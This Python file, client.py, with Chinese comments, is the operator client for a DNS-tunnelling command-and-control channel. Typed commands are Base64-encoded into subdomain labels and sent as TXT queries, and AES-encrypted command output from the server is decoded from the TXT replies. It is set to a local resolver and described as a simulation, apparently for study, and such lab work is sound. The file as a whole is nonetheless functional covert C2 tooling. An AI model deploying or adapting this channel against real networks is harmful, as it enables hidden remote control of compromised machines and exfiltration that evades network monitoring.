# client.py  

import dns.resolver  
import base64  
from crypto import AESCipher  
from config import ROOT_DOMAIN, AES_KEY  
import time  

# 配置客户端使用本地C2模拟服务器  
dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)  
dns.resolver.default_resolver.nameservers = ['127.0.0.1'] # 使用本地服务器进行模拟  

def send_command(command):  
    """通过DNS隧道向C2服务器发送命令"""  
    #先编码成 UTF-8 (如b'echo hello'),再用 Base64 编码成字符串,再把 Base64 字节串再转回普通字符串。
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')  

    # 将编码后的命令按DNS标签长度限制进行分片  
    chunk_size = 60  # 根据DNS标签限制调整分片大小  
    chunks = [encoded_command[i:i + chunk_size] for i in range(0, len(encoded_command), chunk_size)]  
    subdomain = ".".join(chunks)  

    full_domain = f"{subdomain}.{ROOT_DOMAIN}"  
    print(f"通过DNS查询发送命令: {full_domain}")  

    try:  
        # 使用dns.resolver执行DNS查询,向C2服务器查询TXT记录
        answers = dns.resolver.resolve(full_domain, 'TXT')  

        encrypted_result_chunks = []  
        for rdata in answers:  
            for txt_string in rdata.strings:  
                try:  
                    encrypted_result_chunks.append(base64.b64decode(txt_string))  
                except base64.binascii.Error as e:  
                    print(f"解码TXT分片出错: {e}")  

        if encrypted_result_chunks:  
            encrypted_result = b"".join(encrypted_result_chunks)  

            #AES解密,解密的不是自己发的命令，而是服务端返回的命令执行结果
            cipher = AESCipher(AES_KEY)  
            try:  
                result = cipher.decrypt(encrypted_result).decode('utf-8')  
                print("\n--- 命令输出 ---")  
                print(result)  
                print("----------------")  
            except Exception as e:  
                print(f"解密结果出错: {e}")  
        else:  
            print("未收到包含命令输出的TXT记录。")  

    except dns.resolver.NoAnswer:  
        print("DNS查询无应答（无TXT记录）。")  
    except dns.resolver.NXDOMAIN:  
        print(f"DNS查询失败：域名未找到（{full_domain}）")  
    except Exception as e:  
        print(f"DNS查询过程中出错: {e}")  

if __name__ == "__main__":  
    while True:  
        command = input("输入要发送的命令（输入 quit 退出）：")  
        if command.lower() == 'quit':  
            break  
        send_command(command)  
        time.sleep(1) # 增加短暂延迟，避免请求过于频繁